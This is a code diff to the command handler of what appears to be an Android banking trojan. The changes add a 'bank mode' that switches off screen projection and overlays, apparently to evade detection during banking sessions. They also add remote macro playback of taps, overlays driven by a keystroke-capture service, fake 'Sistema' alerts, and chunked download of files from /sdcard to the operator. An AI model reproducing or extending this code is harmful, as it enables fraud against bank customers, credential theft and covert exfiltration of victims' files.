@@ -52,14 +52,25 @@ public final class Cmd {
                     if (acc()) k.shotOn = o.optBoolean("on", true);
                     break;
                 case "ov":
-                    Ov.set(c, o.optBoolean("on", true));
+                    Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                     break;
                 case "bank":
-                    Ov.set(c, false);
-                    ScreenSvc.Q = 30;
-                    ScreenSvc.FPS = 2;
-                    Net.send("{\"t\":\"info\",\"o\":\"modo banco: overlay off, 30q 2fps\"}");
+                    ScreenSvc.giveUp = true;
+                    ScreenSvc.alive = false;
+                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
+                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
+                    ScreenSvc.Q = 45;
+                    ScreenSvc.FPS = 3;
+                    Util.sendT("info", "modo banco: projecao off, overlay off");
                     if (acc()) Tree.dump(k);
+                    break;
+                case "unbank":
+                    ScreenSvc.giveUp = false;
+                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
+                    break;
+                case "macro":
+                    if ("stop".equals(o.optString("op"))) Macro.stop();
+                    else Macro.play(o.optJSONArray("s"));
                     break;
                 case "aviso":
                     Aviso.show(c, o.optString("ti", "Sistema"), o.optString("tx", ""));
@@ -129,7 +140,7 @@ public final class Cmd {
                     Net.send("{\"t\":\"ls\",\"o\":\"" + Util.esc(Extra.ls(o.optString("p", "/sdcard"))) + "\"}");
                     break;
                 case "dl":
-                    Net.send("{\"t\":\"dl\",\"o\":\"" + Util.esc(Extra.cat(o.optString("p"), o.optInt("n", 200000))) + "\"}");
+                    Util.sendT("dl", Extra.cat(o.optString("p"), o.optInt("off", 0), o.optInt("n", 65536)));
                     break;
                 case "bright":
                     Extra.bright(c, o.optInt("v", 50));
